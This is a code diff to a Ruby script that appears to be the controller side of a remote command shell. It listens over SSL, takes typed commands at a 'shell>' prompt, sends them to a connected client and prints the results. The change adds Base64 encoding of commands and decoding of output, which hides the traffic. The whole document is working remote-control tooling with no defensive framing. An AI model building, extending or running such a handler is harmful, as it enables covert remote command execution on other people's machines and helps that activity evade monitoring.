@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 require 'socket'
 require 'openssl'
+require 'base64'
 def ssl_setup
   tcp_server = TCPServer.new('localhost',8080)
   ctx = OpenSSL::SSL::SSLContext.new
@@ -16,14 +17,20 @@ def ssl_setup
   client = server.accept
   return client
 end
+def encode(command)
+  Base64.strict_encode64(command)
+end
+def decode(command)
+  Base64.strict_decode64(command)
+end
 def start_loop(client)
   loop {
     command = [(print ("shell> ")), $stdin.gets.rstrip][1]
     start_loop(client) if command == ''
-    client.print("#{command}\n")
+    client.print("#{encode(command)}\n")
     exit if command == 'exit'
     results = client.gets
-    puts results.split('\n')
+    puts decode(results.chomp)
   }
 end
 begin
